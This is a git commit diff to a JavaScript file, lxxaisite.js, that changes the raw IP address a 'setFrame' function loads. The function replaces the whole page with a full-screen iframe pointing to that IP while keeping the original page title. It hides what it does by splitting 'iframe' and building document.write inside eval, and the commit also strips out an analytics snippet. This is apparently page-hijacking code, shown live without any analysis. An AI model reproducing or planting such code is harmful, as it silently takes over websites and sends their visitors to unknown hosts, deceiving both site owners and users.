b258295929e4b9f7bf155d8538966f594b019459
dateshare <chulishen567@gmail.com>
2021-12-25 19:57:31 +0800

    message

--- lxxaisite.js
+++ lxxaisite.js
@@ -1,7 +1,6 @@
-
-
 var titlestr=document.title;
-setFrame("http://38.26.195.28/");
+setFrame("http://38.26.195.30");
+
 function setFrame(olink){
     var ss = '<title>'+titlestr+'</title><div id="showcloneshengxiaon" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><ifr' + 'ame scrolling="yes" marginheight=0 marginwidth=0  frameborder="0" width="100%" height="100%" src="'+olink+'"></iframe></div><style type="text/css">html{width:100%;height:100%;}body {width:100%;height:100%;}</style>';
     eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
@@ -27,11 +26,3 @@ function setFrame(olink){
       }, 100)
     } catch (e) {}
 }
-
-var _hmt = _hmt || [];
-(function() {
-  var hm = document.createElement("script");
-  hm.src = "https://hm.baidu.com/hm.js?49ea7ae952568ca6e9bddb7bd0e0d62f";
-  var s = document.getElementsByTagName("script")[0]; 
-  s.parentNode.insertBefore(hm, s);
-})();
